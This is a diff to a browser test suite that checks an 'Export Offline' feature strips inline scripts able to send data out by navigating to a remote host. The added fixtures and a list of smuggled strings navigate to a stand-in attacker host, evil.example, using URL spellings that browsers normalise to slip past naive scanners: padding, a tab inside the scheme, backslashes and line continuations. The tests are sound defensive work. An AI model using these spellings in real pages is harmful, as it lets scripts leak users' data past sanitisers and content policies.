@@ -578,6 +578,10 @@ test("Export Offline neutralizes form posts and preserves safe canvas scripts (C
 });
 
 test("a preserved inline script cannot beacon by navigating the offline file to a remote URL (CMH-OFFLINE-05)", async ({ page, browser }) => {
+  // Each smuggled URL spelling is proved against the REAL `validate.py --strict` CLI, and every one
+  // of those runs parses a multi-megabyte exported document in a fresh Python subprocess, so the
+  // default 30s budget is not enough once the URL literal covers five spellings.
+  test.setTimeout(90000);
   // The zero-network CSP blocks every SUBRESOURCE channel but cannot restrict TOP-LEVEL
   // NAVIGATION: `navigate-to` was dropped from CSP Level 3 and ships in no browser, and
   // `sandbox` is ignored when the policy arrives in a <meta>. So a script the export
@@ -621,6 +625,59 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
   // direct assignment above while needing no aliasing, no computed access and no obfuscation.
   window.__cmhSchemeOnlyExfilRan = true;
   if (location.protocol === "file:") location.href = "https:evil.example/scheme-only";
+})();
+</script>
+<script>
+(function () {
+  // A URL the BROWSER NORMALIZES before it resolves it. The leading space is stripped by the URL
+  // parser, so this reaches the same host as the unpadded spelling - one keystroke past a scan
+  // that reads the literal raw.
+  window.__cmhPaddedExfilRan = true;
+  if (location.protocol === "file:") location.href = " https://evil.example/padded";
+})();
+</script>
+<script>
+(function () {
+  // An ASCII tab INSIDE the scheme. The URL parser removes tab, LF and CR from anywhere in its
+  // input, and a real tab is legal inside an ordinary string literal.
+  window.__cmhTabExfilRan = true;
+  if (location.protocol === "file:") window.location.href = "ht\ttps://evil.example/tab";
+})();
+</script>
+<script>
+(function () {
+  // A real BACKSLASH where a slash is expected: for a special scheme the URL parser treats the two
+  // alike, so this schemeless authority resolves exactly like "//evil.example". Written with four
+  // source backslashes because a JS string literal needs two per runtime backslash.
+  window.__cmhBackslashExfilRan = true;
+  if (location.protocol === "file:") location.replace("\\\\\\\\evil.example/back");
+})();
+</script>
+<script>
+(function () {
+  // The other half of the same shape: an ESCAPED slash, which the JS string literal turns back into
+  // a plain slash the URL parser reads as an authority slash.
+  window.__cmhEscapedSlashExfilRan = true;
+  if (location.protocol === "file:") location.href = "\\//evil.example/escaped";
+})();
+</script>
+<script>
+(function () {
+  // A JavaScript LineContinuation - a backslash followed by a real line terminator - evaluates to
+  // NOTHING, so the literal below IS the bare network URL. Unlike a character escape it needs no
+  // decoding to see, which is why it is closed rather than left in the residual.
+  window.__cmhContinuationExfilRan = true;
+  if (location.protocol === "file:") location.href = "\\
+https://evil.example/continued";
+})();
+</script>
+<script>
+(function () {
+  // Control: a padded network URL that is only ever DISPLAYED, and a navigation to a LOCAL
+  // fragment that merely starts with the same padding. Tolerating the characters a browser
+  // normalizes away must not start deleting these.
+  window.__cmhPaddedStringKept = "  https://docs.example.org/guide";
+  if (location.hash === "#docs") location.href = " #docs-section";
 })();
 </script>
 <script>
@@ -684,6 +741,7 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
     expect(exportedHtml).not.toContain("evil.example");
     expect(exportedHtml).toContain("window.__cmhBenignLocationKept = true");
     expect(exportedHtml).toContain('window.__cmhSchemeStringKept = "https:"');
+    expect(exportedHtml).toContain("window.__cmhPaddedStringKept =");
     // The costlier failure direction: a benign script that merely SHADOWS `location` / `open`
     // with local bindings must survive intact, or an ordinary authored document is silently
     // broken by the export.
@@ -692,7 +750,7 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
     // Removing a script is content loss, so the user is told rather than left to guess - and the
     // COUNT must be right, or a miscount regression would read as a pass. Matched with a word
     // boundary, since a plain substring would also be satisfied by "14 scripts ... removed.".
-    await expect(page.locator("#toast")).toContainText(/\b4 scripts that load, prefetch, or navigate to the network were removed\./);
+    await expect(page.locator("#toast")).toContainText(/\b9 scripts that load, prefetch, or navigate to the network were removed\./);
     // A navigation that does still happen (a user-clicked link, or a script that builds the
     // URL dynamically) must at least not leak where it came from. The fixture authors a
     // PERMISSIVE `unsafe-url` policy both as a document meta and on the anchor itself, so this
@@ -715,6 +773,11 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
     const smuggles = [
       'location.href = "https://evil.example/steal";',
       'location.href = "https:evil.example/steal";',
+      'location.href = " https://evil.example/steal";',
+      'location.href = "ht\ttps://evil.example/steal";',
+      'location.href = "\\\\\\\\evil.example/steal";',
+      'location.href = "\\//evil.example/steal";',
+      'location.href = "\\\nhttps://evil.example/steal";',
     ];
     for (const [i, smuggle] of smuggles.entries()) {
       const smuggledPath = path.join(outDir, "offline-navigation-smuggled-" + i + ".html");
@@ -748,7 +811,13 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
         openExfilRan: window.__cmhOpenExfilRan === true,
         chainExfilRan: window.__cmhChainExfilRan === true,
         schemeOnlyExfilRan: window.__cmhSchemeOnlyExfilRan === true,
+        paddedExfilRan: window.__cmhPaddedExfilRan === true,
+        tabExfilRan: window.__cmhTabExfilRan === true,
+        backslashExfilRan: window.__cmhBackslashExfilRan === true,
+        escapedSlashExfilRan: window.__cmhEscapedSlashExfilRan === true,
+        continuationExfilRan: window.__cmhContinuationExfilRan === true,
         schemeStringKept: window.__cmhSchemeStringKept,
+        paddedStringKept: window.__cmhPaddedStringKept,
         benignKept: window.__cmhBenignLocationKept === true,
         localShadowKept: window.__cmhLocalShadowKept,
         localOpenArg: window.__cmhLocalOpenArg,
@@ -764,7 +833,13 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
     expect(state.openExfilRan).toBe(false);
     expect(state.chainExfilRan).toBe(false);
     expect(state.schemeOnlyExfilRan).toBe(false);
+    expect(state.paddedExfilRan).toBe(false);
+    expect(state.tabExfilRan).toBe(false);
+    expect(state.backslashExfilRan).toBe(false);
+    expect(state.escapedSlashExfilRan).toBe(false);
+    expect(state.continuationExfilRan).toBe(false);
     expect(state.schemeStringKept).toBe("https:");
+    expect(state.paddedStringKept).toBe("  https://docs.example.org/guide");
     expect(state.benignKept).toBe(true);
     expect(state.localShadowKept).toBe("https://api.example.org/v1");
     expect(state.localOpenArg).toBe("https://docs.example.org/guide");
